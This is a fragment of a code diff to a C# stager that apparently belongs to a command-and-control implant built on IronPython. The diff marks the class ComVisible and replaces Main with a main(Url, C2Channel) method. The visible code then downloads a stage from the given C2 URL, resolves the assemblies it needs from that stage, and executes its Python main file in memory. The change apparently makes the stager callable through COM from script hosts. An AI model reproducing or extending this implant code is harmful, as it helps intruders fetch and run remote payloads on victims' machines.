@@ -5,9 +5,11 @@ using System.IO.Compression;
 using System.Reflection;
 using System.Net;
 using IronPython.Hosting;
+using System.Runtime.InteropServices;
 //using System.Net.WebSockets;
 //using IronPython.Runtime.Operations;
 
+[ComVisible(true)]
 public class ST
 {
     static ST()
@@ -103,34 +105,29 @@ public class ST
         //result = PythonOps.InitializeModuleEx(Assembly.Load(GetResourceInZip(stage, "Main.dll")), "__main__", null, false, null);
         engine.Execute(System.Text.Encoding.UTF8.GetString(mainfile, 0, mainfile.Length), scope);
     }
-    public static void Main(string[] args)
+    public void main(string Url, string C2Channel)
     {
         string[] SupportedChannels = { "http" };
-        string Channel = "http";
-        Uri URL;
- 
-        switch (args.Length)
+
+        if (!(Array.IndexOf(SupportedChannels, C2Channel.ToLower()) >= 0))
         {
-            case 2:
-                URL = new Uri(args[0]);
-                if (Array.IndexOf(SupportedChannels, Channel.ToLower()) >= 0)
-                {
-                    Channel = args[1].ToLower();
-                }
-                break;
-            case 1:
-                URL = new Uri(args[0]);
-                break;
-            default:
-                return;
+            return;
         }
+
+        if (Url == "")
+        {
+            return;
+        }
+
+        string Channel = C2Channel;
+        Uri URL = new Uri(Url);
 
 #if DEBUG
         Console.WriteLine("URL: {0}", URL);
         Console.WriteLine("Channel: {0}", Channel);
         Console.WriteLine();
 #endif
-        var stage = Stage(URL, Channel); 
+        var stage = Stage(URL, Channel);
         AppDomain.CurrentDomain.AssemblyResolve += (sender, resargs) =>
         {
             string name = resargs.Name.Substring(0, resargs.Name.IndexOf(','));
